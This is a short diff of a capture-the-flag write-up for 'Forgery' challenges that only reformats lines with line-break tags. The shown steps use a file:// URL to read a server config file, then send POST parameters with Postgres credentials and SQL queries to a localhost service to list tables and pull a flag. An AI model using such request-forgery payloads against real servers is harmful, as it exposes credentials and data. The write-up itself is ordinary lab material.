@@ -71,10 +71,10 @@ In the url input: ```file:///var/www/html/api/config.php```<br>
 We got the first flag, but also some credentials for Forgery 102
 
 ### Forgery 102
-URL: ```http://localhost:8080```
-Method: ```POST```
-Params: ```user=postgres&password=Let%26me%3Din&query=SELECT * FROM pg_tables```
-then modify the params for ```user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_numbersFoundWithPreviousCommand```
+URL: ```http://localhost:8080```<br>
+Method: ```POST```<br>
+Params: ```user=postgres&password=Let%26me%3Din&query=SELECT * FROM pg_tables```<br>
+Then modify the params for ```user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_numbersFoundWithPreviousCommand```
 
 ### Forgery 103
 Different commands to try in the params:
